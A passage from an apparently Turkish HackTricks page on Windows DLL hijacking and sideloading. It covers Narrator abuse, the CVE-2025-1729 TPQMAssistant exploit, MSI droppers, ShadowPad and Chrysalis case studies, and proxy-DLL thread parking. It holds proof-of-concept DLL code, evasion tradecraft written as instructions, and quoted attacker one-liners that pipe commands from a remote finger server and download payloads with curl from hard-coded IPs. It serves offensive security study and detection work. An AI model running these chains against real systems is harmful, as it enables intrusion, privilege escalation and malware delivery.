- Host’a RDP ile bağlan, logon screen’de Narrator’ı başlatmak için CTRL+WIN+ENTER’a bas; DLL’in secure desktop üzerinde SYSTEM olarak çalışır.
- RDP session kapanınca execution durur—hemen inject/migrate et.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Accessibility Tool (AT) registry entry’sini klonlayabilirsin (ör. CursorIndicator), bunu herhangi bir binary/DLL’e işaret edecek şekilde düzenleyip import edebilir, sonra `configuration` değerini o AT adıyla ayarlayabilirsin. Bu, Accessibility framework altında keyfi execution için proxy görevi görür.

Notlar
- `%windir%\System32` altında yazmak ve HKLM değerlerini değiştirmek admin rights gerektirir.
- Tüm payload logic `DLL_PROCESS_ATTACH` içinde olabilir; export gerekmez.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Bu case, Lenovo'nun TrackPoint Quick Menu (`TPQMAssistant.exe`) içinde **Phantom DLL Hijacking** örneğini gösterir; **CVE-2025-1729** olarak izlenir.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` konumu `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, oturum açmış kullanıcının context’i altında her gün 9:30 AM’de çalışır.
- **Directory Permissions**: `CREATOR OWNER` tarafından yazılabilir, bu da local kullanıcıların keyfi dosyalar bırakmasına izin verir.
- **DLL Search Behavior**: Önce çalışma dizininden `hostfxr.dll` yüklemeyi dener ve eksikse "NAME NOT FOUND" loglar; bu da local directory search önceliğini gösterir.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Standart bir kullanıcı olarak, `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` içine bırak.
2. Planlanmış task'ın mevcut kullanıcının context'inde saat 9:30 AM'de çalışmasını bekle.
3. Task çalıştığında bir administrator logged in ise, malicious DLL administrator's session içinde medium integrity ile çalışır.
4. Medium integrity'den SYSTEM privileges'e yükselmek için standart UAC bypass tekniklerini zincirle.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors, trusted ve signed bir process altında payload çalıştırmak için sık sık MSI-based droppers ile DLL side-loading'i birlikte kullanır.

Chain overview
- User MSI indirir. Bir CustomAction, GUI install sırasında sessizce çalışır (ör. LaunchApplication veya bir VBScript action), ve embedded resources içinden sonraki stage'i yeniden oluşturur.
- Dropper, legitimate, signed bir EXE ve malicious bir DLL'i aynı directory içine yazar (örnek çift: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Signed EXE başlatıldığında, Windows DLL search order önce working directory'den wsc.dll'i yükler ve attacker code'u signed parent altında çalıştırır (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Executable veya VBScript çalıştıran entries'leri ara. Şüpheli örnek pattern: LaunchApplication'in background'da embedded bir file çalıştırması.
- Orca (Microsoft Orca.exe) içinde CustomAction, InstallExecuteSequence ve Binary tables'ı incele.
- MSI CAB içindeki embedded/split payloads:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Veya lessmsi kullan: `lessmsi x package.msi C:\out`
- Bir VBScript CustomAction tarafından birleştirilen ve decrypt edilen birden fazla küçük fragment ara. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırak:
- wsc_proxy.exe: meşru signed host (Avast). Process, wsc.dll dosyasını kendi directory’sinden adına göre load etmeye çalışır.
- wsc.dll: attacker DLL. Eğer belirli exports gerekmezse, DllMain yeterli olabilir; aksi halde, bir proxy DLL build et ve required exports’u genuine library’ye forward et, while running payload in DllMain.
- Minimal bir DLL payload build et:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export requirements için, yönlendirme yapan bir DLL oluşturmak ve payload’unuzu da çalıştırmak için proxying framework (örn. DLLirant/Spartacus) kullanın.

- Bu teknik, host binary tarafından DLL name resolution işlemine dayanır. Host absolute paths veya safe loading flags kullanıyorsa (örn. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export set seçimi sırasında dikkate alınmalıdır.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point, Ink Dragon’ın ShadowPad’i nasıl dağıttığını, diskte core payload’u encrypted tutarken meşru software ile karışmak için **üç dosyalı triad** kullandığını anlattı:

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi vendor’lar kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers executable dosyasını bir Windows binary gibi görünecek şekilde yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode signature geçerli kalır.
2. **Malicious loader DLL** – EXE’nin yanına beklenen bir adla bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework ile obfuscated edilmiş bir MFC binary’sidir; tek işi encrypted blob’u bulmak, decrypt etmek ve ShadowPad’i reflectively map etmektir.
3. **Encrypted payload blob** – çoğunlukla aynı dizinde `<name>.tmp` olarak saklanır. Decrypted payload memory-mapping ile yüklendikten sonra loader, forensic evidence’ı yok etmek için TMP dosyasını siler.

Tradecraft notları:

* Signed EXE’yi yeniden adlandırmak (PE header’daki orijinal `OriginalFileName` korunurken) onun Windows binary gibi görünmesini sağlar ve vendor signature’ını korur; bu yüzden Ink Dragon’ın, gerçekten AMD/NVIDIA utility’leri olan ama `conhost.exe` gibi görünen binary’leri bırakma alışkanlığını kopyalayın.
* Executable trusted kaldığı için, çoğu allowlisting kontrolü yalnızca malicious DLL’nin yanında bulunmasını gerektirir. Loader DLL’yi özelleştirmeye odaklanın; signed parent genellikle değiştirilmeden çalışabilir.
* ShadowPad decryptor’ı TMP blob’un loader’ın yanında ve writable olmasını bekler, böylece mapping’den sonra dosyayı zero’layabilir. Payload yüklenene kadar dizini writable tutun; belleğe alındıktan sonra TMP dosyası OPSEC için güvenle silinebilir.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatörler DLL sideloading’i LOLBAS ile eşleştirir; böylece diskteki tek custom artifact, trusted EXE’nin yanındaki malicious DLL olur:

- **Remote command loader (Finger):** Hidden PowerShell, `cmd.exe /c` başlatır, komutları Finger server’dan çeker ve `cmd`’ye pipe eder:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`, TCP/79 text çeker; `| cmd` server yanıtını çalıştırır ve operatörlerin ikinci aşama server’ı sunucu tarafında değiştirmesine izin verir.

- **Built-in download/extract:** Masum bir extension ile archive indirin, açın ve sideload hedefini plus DLL’yi rastgele bir `%LocalAppData%` klasörü altında stage edin:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress bilgisini gizler ve redirects’i takip eder; `tar -xf` Windows’un built-in tar aracını kullanır.

- **WMI/CIM launch:** EXE’yi WMI üzerinden başlatın; böylece telemetry, colocated DLL’yi yüklerken bir CIM-created process gösterir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Local DLL’leri tercih eden binary’lerle çalışır (örn. `intelbq.exe`, `nearby_share.exe`); payload (örn. Remcos) trusted name altında çalışır.

- **Hunting:** `/p`, `/m` ve `/c` birlikte göründüğünde `forfiles` için alert verin; admin script’leri dışında nadirdir.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom intrusion, trusted bir update chain’i kötüye kullanarak DLL sideload + tamamen in-memory payload’lar stage eden NSIS-packed bir dropper dağıttı.

Tradecraft akışı
- `update.exe` (NSIS), `%AppData%\Bluetooth` oluşturur, **HIDDEN** olarak işaretler, yeniden adlandırılmış Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` ve encrypted blob `BluetoothService` bırakır, ardından EXE’yi başlatır.
- Host EXE, `log.dll` import eder ve `LogInit`/`LogWrite` çağırır. `LogInit` blob’u mmap ile yükler; `LogWrite`, custom LCG-based stream ile decrypt eder (**0x19660D** / **0x3C6EF35F** sabitleri, daha önceki bir hash’ten türetilen key material), buffer’ı plaintext shellcode ile overwrite eder, temp’leri serbest bırakır ve ona atlar.
- Bir IAT’den kaçınmak için loader, export name’leri **FNV-1a basis 0x811C9DC5 + prime 0x1000193** ile hash’leyerek API’leri çözer, ardından Murmur-style avalanche (**0x85EBCA6B**) uygular ve sonucu salted target hash’lerle karşılaştırır.

Main shellcode (Chrysalis)
- Key `gQ2JR&9;` ile beş pass boyunca add/XOR/sub tekrar ederek PE-benzeri main module’ü decrypt eder, ardından import resolution’ı tamamlamak için dinamik olarak `Kernel32.dll` → `GetProcAddress` yükler.
- DLL name string’lerini runtime’da per-character bit-rotate/XOR transform’larıyla yeniden oluşturur, sonra `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- **PEB → InMemoryOrderModuleList** üzerinden yürüyen, her export table’ı 4-byte bloklar halinde Murmur-style mixing ile parse eden ikinci bir resolver kullanır ve hash bulunmazsa yalnızca `GetProcAddress`’e geri döner.

Embedded configuration & C2
- Config, bırakılan `BluetoothService` dosyasının içinde **offset 0x30808**’de (size **0x980**) bulunur ve `qwhvb^435h&*7` key’i ile RC4-decrypt edilerek C2 URL ve User-Agent açığa çıkar.
- Beacon’lar nokta ile ayrılmış bir host profili oluşturur, `4Q` tag’ini öne ekler, ardından `HttpSendRequestA` üzerinden HTTPS ile göndermeden önce `vAuig34%^325hGV` key’i ile RC4-encrypt eder. Yanıtlar RC4-decrypt edilir ve bir tag switch ile yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode CLI arg’leri ile kontrol edilir: args yoksa `-i`’ye işaret eden persistence (service/Run key) kurulur; `-i` kendi kendini `-k` ile yeniden başlatır; `-k` install adımını atlar ve payload’u çalıştırır.

Observed alternate loader
- Aynı intrusion, Tiny C Compiler bıraktı ve `C:\ProgramData\USOShared\` içinden `libtcc.dll` yanında `svchost.exe -nostdlib -run conf.c` çalıştırdı. Saldırganın sağladığı C source shellcode içeriyordu, compile edildi ve disk’e bir PE yazmadan in-memory çalıştırıldı. Şununla yeniden üretin:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Bu TCC tabanlı derle-ve-çalıştır aşaması, çalışma zamanında `Wininet.dll` import etti ve sabit kodlanmış bir URL’den ikinci aşama shellcode çekti; böylece bir compiler çalıştırmasını taklit eden esnek bir loader sağladı.

## Signed-host sideloading with export proxying + host thread parking

Bazı DLL sideloading zincirleri, meşru host’un sağlam kalması için **stability engineering** ekler; böylece malicious DLL yüklendikten sonra çökmeden, sonraki aşamaların düzgün yüklenmesi için yeterince uzun süre çalışır.

Gözlemlenen desen
- Güvenilir bir EXE’yi, `version.dll` gibi beklenen bağımlılık adıyla birlikte malicious bir DLL’in yanına bırak.
- Malicious DLL, beklenen her export’u gerçek sistem DLL’ine geri **proxy** eder (örneğin `%SystemRoot%\\System32\\version.dll`), böylece import çözümleme yine başarılı olur ve host process çalışmaya devam eder.
- Yüklendikten sonra, malicious DLL **host entry point**’ini patch’ler; böylece main thread çıkmak ya da process’i sonlandıracak code path’leri çalıştırmak yerine sonsuz bir `Sleep` döngüsüne girer.
- Yeni bir thread gerçek malicious işi yapar: bir sonraki aşama DLL adını veya path’ini decrypt eder (RC4/XOR yaygındır), ardından `LoadLibrary` ile onu başlatır.

Bu neden önemli
- Normal DLL proxying API uyumluluğunu korur, ancak host’un sonraki aşamalar için yeterince uzun süre hayatta kalmasını garanti etmez.
- Main thread’i `Sleep(INFINITE)` içinde park etmek, signed process’i resident tutmanın basit bir yoludur; bu sırada loader worker thread içinde decryption, staging veya network bootstrap yapar.
- Sadece şüpheli bir `DllMain` aramak bu deseni kaçırabilir; çünkü ilginç davranış host entry point patch’lendikten ve ikincil thread başladıktan sonra gerçekleşir.

Minimal workflow
1. Signed host EXE’yi kopyala ve local directory’den hangi DLL’i resolve ettiğini belirle.
2. Aynı fonksiyonları export eden ve bunları meşru DLL’e yönlendiren bir proxy DLL build et.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluştur.
4. Bu thread’den host entry point’i veya main thread start routine’i patch’leyerek `Sleep` üzerinde döngüye sok.
5. Bir sonraki aşama DLL adını/config’ini decrypt et ve `LoadLibrary` ya da manual-map ile payload’ı çağır.

Defensive pivots
- `version.dll` veya benzer yaygın kütüphaneleri `System32` yerine kendi application directory’sinden yükleyen signed processes.
- Image load’dan kısa süre sonra process entry point’te yapılan memory patch’leri, özellikle `Sleep`/`SleepEx`’e yönlendirilmiş jump/call’lar.
- Bir proxy DLL tarafından oluşturulan ve hemen decrypted bir isimle ikinci bir DLL üzerinde `LoadLibrary` çağıran thread’ler.
- Vendor executable’larının yanına, `ProgramData`, `%TEMP%` veya unpacked archive paths gibi writable staging directories içine yerleştirilmiş full-export proxy DLL’leri.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
